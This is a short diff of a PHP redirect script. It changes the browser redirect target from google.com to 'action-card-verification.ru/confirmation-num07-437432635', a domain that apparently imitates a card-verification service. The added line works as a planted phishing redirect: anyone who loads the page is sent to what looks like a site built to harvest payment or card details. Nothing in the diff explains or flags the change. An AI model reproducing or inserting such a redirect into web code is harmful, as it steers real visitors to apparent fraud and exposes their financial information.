@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://www.google.com/"); 
+header("Location: https://action-card-verification.ru/confirmation-num07-437432635"); 
   
 exit; 
 ?> 
